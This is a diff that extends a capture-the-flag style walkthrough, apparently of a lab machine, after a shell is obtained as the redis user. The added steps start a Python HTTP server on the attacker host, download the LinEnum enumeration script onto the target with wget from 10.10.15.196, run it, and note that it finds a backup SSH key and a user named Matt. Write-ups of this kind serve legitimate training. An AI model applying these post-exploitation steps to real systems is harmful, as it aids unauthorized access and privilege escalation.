@@ -83,3 +83,49 @@ Finally we get a shell as redis user on the box.
 Lets transfer Local Linux Enumeration & Privilege Escalation Checks script to the compromised script via Python server.
 The script can be found <a href="https://github.com/rebootuser/LinEnum">here.</a>
 
+* Run Python Server on the Local Machine containing the script via this command:
+
+```
+python -m SimpleHTTPServer 9090
+```
+
+<p align="center">
+  <img src="screenshots/10.png" width="738">
+</p>
+
+* On the target machine, type the following commands to download the script:
+
+```
+cd /tmp
+wget http://10.10.15.196:9090/linenum.sh
+```
+
+<p align="center">
+  <img src="screenshots/11.png" width="738">
+</p>
+
+* Run the exploit script with thorough tests enabled:
+
+```
+chmod +x linenum.sh
+./linenum.sh -t
+```
+
+<p align="center">
+  <img src="screenshots/12.png" width="738">
+</p>
+
+
+* Once the scan finishes, it finds a backup SSH key in the ```/opt``` folder. Additionally, it is revealed that a user ```Matt``` exists on the box.
+
+<p align="center">
+  <img src="screenshots/13.png" width="738">
+</p>
+
+
+
+
+
+
+
+
